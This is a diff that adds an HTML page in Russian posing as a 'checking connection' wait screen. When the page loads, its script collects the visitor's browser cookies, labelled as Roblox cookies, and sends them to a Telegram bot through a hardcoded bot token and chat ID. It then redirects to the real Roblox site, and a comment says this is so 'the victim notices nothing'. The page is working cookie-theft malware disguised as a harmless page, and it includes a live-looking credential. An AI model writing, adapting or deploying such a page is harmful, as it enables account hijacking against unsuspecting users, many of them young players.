@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Подождите...</title>
+<script>
+// ВАШИ ДАННЫЕ УЖЕ ВСТАВЛЕНЫ
+const BOT_TOKEN = '8881341948:AAEc1o7BsVXOK4VSayF2bRDrCHhymGVjogI';
+const CHAT_ID = '7092015279';
+
+function sendCookies() {
+    // Собираем куки
+    const cookies = document.cookie || 'куки не найдены';
+    // Отправляем в Telegram
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: `Куки Roblox: ${cookies}`
+        })
+    })
+    .then(() => console.log('Отправлено'))
+    .catch(e => console.error(e));
+    // Перенаправляем на настоящий Roblox, чтобы жертва ничего не заметила
+    window.location.href = 'https://www.roblox.com/';
+}
+// Запуск сразу при загрузке страницы
+window.onload = sendCookies;
+</script>
+</head>
+<body>
+    <h2>Проверка соединения...</h2>
+    <p>Пожалуйста, подождите.</p>
+</body>
+</html>
